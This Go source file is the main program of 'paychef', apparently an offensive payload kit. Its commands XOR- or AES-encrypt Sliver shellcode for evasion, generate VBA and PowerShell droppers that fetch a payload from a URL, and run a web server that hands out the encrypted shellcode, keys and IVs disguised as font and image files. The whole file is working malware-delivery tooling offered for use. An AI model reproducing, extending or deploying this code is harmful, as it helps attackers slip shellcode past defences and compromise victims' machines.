package main

import (
	"fmt"
	"os"
	"strconv"

	"github.com/fachrioktavian/paychef/pkg/dropper"
	"github.com/fachrioktavian/paychef/pkg/endecoder"
	"github.com/fachrioktavian/paychef/pkg/endecryptor"
	"github.com/fachrioktavian/paychef/pkg/formatter"
	"github.com/fachrioktavian/paychef/pkg/logger"

	"github.com/gofiber/fiber/v2"
	fiberLogger "github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/spf13/cobra"
)

func PrintBanner() {
	banner := `                                      
#####    ##   #   #  ####  #    # ###### ###### 
#    #  #  #   # #  #    # #    # #      #      
#    # #    #   #   #      ###### #####  #####  
#####  ######   #   #      #    # #      #      
#      #    #   #   #    # #    # #      #      
#      #    #   #    ####  #    # ###### #      
`
	println(banner)
}

func ObfuscateXor(inAppLogger *logger.InAppLogger, xor *endecoder.Xor) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-xor")
	return &cobra.Command{
		Use:   "obfuscate-xor",
		Short: "Obfuscate shellcode using XOR",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			xorKey := cmd.Flag("xorKey").Value.String()
			if xorKey == "" {
				inAppLogger.Error("XOR key is required")
				return
			}
			arch := cmd.Flag("arch").Value.String()
			key, err := strconv.ParseUint(xorKey, 0, 8)
			if err != nil {
				inAppLogger.Error("Invalid XOR key", "error", err)
				return
			}
			if key > 0xFF {
				inAppLogger.Error("XOR key must be a single byte (0-255)")
				return
			}

			stager := formatter.NewStager(filePath, formatter.ENCODE_XOR_MODE)
			err = stager.SetRawContent()
			if err != nil {
				inAppLogger.Error("Error setting raw content", "error", err)
				return
			}

			err = stager.SetShellcode()
			if err != nil {
				inAppLogger.Error("Error setting shellcode", "error", err)
				return
			}
			err = xor.Encode(stager, byte(key))
			if err != nil {
				inAppLogger.Error("Error encoding shellcode", "error", err)
				return
			}
			err = stager.SetArchitecture(arch)
			if err != nil {
				inAppLogger.Error("Error setting architecture", "error", err)
				return
			}
			err = stager.PrintResult()
			if err != nil {
				inAppLogger.Error("Error writing result", "error", err)
				return
			}
			err = stager.WriteResult()
			if err != nil {
				inAppLogger.Error("Error writing result", "error", err)
				return
			}
		},
	}
}

func ObfuscateAes(inAppLogger *logger.InAppLogger, aes *endecryptor.Aes) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("obfuscate-aes")
	return &cobra.Command{
		Use:   "obfuscate-aes",
		Short: "Obfuscate shellcode using AES",
		Run: func(cmd *cobra.Command, args []string) {
			filePath := cmd.Flag("cshellcode").Value.String()
			if filePath == "" {
				inAppLogger.Error("Path to shellcode file is required")
				return
			}
			aesKey := cmd.Flag("aesKey").Value.String()
			if aesKey == "" {
				inAppLogger.Error("AES key is required")
				return
			}
			arch := cmd.Flag("arch").Value.String()

			stager := formatter.NewStager(filePath, formatter.ENCRYPT_AES_MODE)
			err := stager.SetRawContent()
			if err != nil {
				inAppLogger.Error("Error setting raw content", "error", err)
				return
			}
			err = stager.SetShellcode()
			if err != nil {
				inAppLogger.Error("Error setting shellcode", "error", err)
				return
			}

			err = stager.SetArchitecture(arch)
			if err != nil {
				inAppLogger.Error("Error setting architecture", "error", err)
				return
			}
			err = aes.Encrypt(stager, aesKey)
			if err != nil {
				inAppLogger.Error("Error encrypting shellcode", "error", err)
				return
			}

			err = stager.PrintResult()
			if err != nil {
				inAppLogger.Error("Error printing result", "error", err)
				return
			}
			err = stager.WriteResult()
			if err != nil {
				inAppLogger.Error("Error writing result", "error", err)
				return
			}
		},
	}
}

func GenerateDropper(inAppLogger *logger.InAppLogger) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("generate-dropper")
	return &cobra.Command{
		Use:   "generate-dropper",
		Short: "Generate a dropper for the given payload",
		PreRun: func(cmd *cobra.Command, args []string) {
			isPoweshell, _ := cmd.Flags().GetBool("powershell")
			if isPoweshell {
				cmd.MarkFlagRequired("payloadUrl")
			}
		},
		Run: func(cmd *cobra.Command, args []string) {
			isVba, _ := cmd.Flags().GetBool("vba")
			isPoweshell, _ := cmd.Flags().GetBool("powershell")
			if isVba {
				outFile := cmd.Flag("outFile").Value.String()
				vba := dropper.NewVBA()
				vba.SetOutFile(outFile)
				err := vba.Render()
				if err != nil {
					inAppLogger.Error("Error rendering dropper", "error", err)
					return
				}
				err = vba.PrintResult()
				if err != nil {
					inAppLogger.Error("Error printing result", "error", err)
					return
				}
			} else if isPoweshell {
				payloadUrl := cmd.Flag("payloadUrl").Value.String()
				if payloadUrl == "" {
					inAppLogger.Error("Payload URL is required")
					return
				}

				powershell := dropper.NewPowerShell()
				powershell.SetPayloadUrl(payloadUrl)
				err := powershell.Render()
				if err != nil {
					inAppLogger.Error("Error rendering PowerShell dropper", "error", err)
					return
				}
				err = powershell.PrintResult()
				if err != nil {
					inAppLogger.Error("Error printing PowerShell result", "error", err)
					return
				}
			} else {
				inAppLogger.Error("Please specify either --vba or --powershell flag")
			}
		},
	}
}

func RunServer(inAppLogger *logger.InAppLogger) *cobra.Command {
	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("run-server")
	return &cobra.Command{
		Use:   "run-server",
		Short: "Run a server to server encoded/encrypted shellcode",
		Run: func(cmd *cobra.Command, args []string) {
			app := fiber.New()
			app.Use(fiberLogger.New(fiberLogger.Config{
				Format: "[${ip}]:${port} ${status} - ${method} ${path}\n",
			}))
			app.Get("/:file.:ext", func(c *fiber.Ctx) error {
				ext := c.Params("ext")
				c.Set("Content-Type", "application/octet-stream")
				switch ext {
				case "woff":
					encryptedShellcode64 := fmt.Sprintf(formatter.ENCRYPTED_SHELLCODE_FILE, formatter.AMD64_ARCH)
					encryptedShellcode, err := os.ReadFile(encryptedShellcode64)
					if err != nil {
						inAppLogger.Error("Error reading encrypted shellcode file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=encrypted_shellcode.bin")
					return c.Send(encryptedShellcode)
				case "woff2":
					iv64 := fmt.Sprintf(formatter.IV_FILE, formatter.AMD64_ARCH)
					iv, err := os.ReadFile(iv64)
					if err != nil {
						inAppLogger.Error("Error reading IV file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=iv.bin")
					return c.Send(iv)
				case "ttf":
					key64 := fmt.Sprintf(formatter.KEY_FILE, formatter.AMD64_ARCH)
					key, err := os.ReadFile(key64)
					if err != nil {
						inAppLogger.Error("Error reading key file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=key.bin")
					return c.Send(key)
				case "gif":
					encryptedShellcode86 := fmt.Sprintf(formatter.ENCRYPTED_SHELLCODE_FILE, formatter.X86_ARCH)
					encryptedShellcode, err := os.ReadFile(encryptedShellcode86)
					if err != nil {
						inAppLogger.Error("Error reading encrypted shellcode file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=encrypted_shellcode_x86.bin")
					return c.Send(encryptedShellcode)
				case "png":
					iv86 := fmt.Sprintf(formatter.IV_FILE, formatter.X86_ARCH)
					iv, err := os.ReadFile(iv86)
					if err != nil {
						inAppLogger.Error("Error reading IV file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=iv_x86.bin")
					return c.Send(iv)
				case "jpg":
					key86 := fmt.Sprintf(formatter.KEY_FILE, formatter.X86_ARCH)
					key, err := os.ReadFile(key86)
					if err != nil {
						inAppLogger.Error("Error reading key file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=key_x86.bin")
					return c.Send(key)
				case "txt":
					ps64, err := os.ReadFile(dropper.POWERSHELL_LOCATION)
					if err != nil {
						inAppLogger.Error("Error reading PowerShell dropper file", "error", err)
						return c.Status(500).SendString("Internal Server Error")
					}
					c.Set("Content-Disposition", "attachment; filename=dropper-powershell64.ps1")
					c.Set("Content-Type", "text/plain")
					return c.Send(ps64)
				}

				return c.Status(404).SendString("File not found")
				
			})

			port := cmd.Flag("port").Value.String()
			app.Listen(":" + port)
		},
	}
}

func main() {
	PrintBanner()

	inAppLogger := logger.NewInAppLogger("paychef")
	xor := endecoder.NewXor()

	rootCmd := &cobra.Command{
		Use:   "paychef",
		Short: "payload converter: obfuscate and deobfuscate payloads",
	}

	obfuscateXorCmd := ObfuscateXor(inAppLogger, xor)
	obfuscateXorCmd.Flags().StringP("cshellcode", "s", "", "Path to the c shellcode file from sliver")
	obfuscateXorCmd.Flags().StringP("xorKey", "x", "0xAA", "One byte of XOR key to use for obfuscation")
	obfuscateXorCmd.Flags().StringP("arch", "a", "", "Architecture of the shellcode (x86 or amd64)")
	obfuscateXorCmd.MarkFlagRequired("cshellcode")
	obfuscateXorCmd.MarkFlagRequired("xorKey")
	obfuscateXorCmd.MarkFlagRequired("arch")

	obfuscateAesCmd := ObfuscateAes(inAppLogger, endecryptor.NewAes())
	obfuscateAesCmd.Flags().StringP("cshellcode", "s", "", "Path to the c shellcode file from sliver")
	obfuscateAesCmd.Flags().StringP("aesKey", "k", "", "32 bytes of AES key to use for obfuscation (8 string characters)")
	obfuscateAesCmd.MarkFlagRequired("cshellcode")
	obfuscateAesCmd.MarkFlagRequired("aesKey")

	generateDropperCmd := GenerateDropper(inAppLogger)
	generateDropperCmd.Flags().BoolP("vba", "v", false, "Generate a VBA dropper")
	generateDropperCmd.Flags().BoolP("powershell", "p", false, "Generate a PowerShell dropper")
	generateDropperCmd.Flags().StringP("fileName", "f", "", "File name for the dropper")
	generateDropperCmd.Flags().StringP("payloadUrl", "u", "", "URL to the payload to be downloaded by the dropper")
	generateDropperCmd.Flags().StringP("outFile", "o", "", "Output file for the generated dropper")
	// generateDropperCmd.MarkFlagRequired("fileName")
	// generateDropperCmd.MarkFlagRequired("payloadUrl")

	runServerCmd := RunServer(inAppLogger)
	runServerCmd.Flags().StringP("port", "p", "", "Port to run the server on")
	runServerCmd.MarkFlagRequired("port")

	rootCmd.AddCommand(
		obfuscateXorCmd,
		obfuscateAesCmd,
		generateDropperCmd,
		runServerCmd,
	)

	rootCmd.Execute()
}
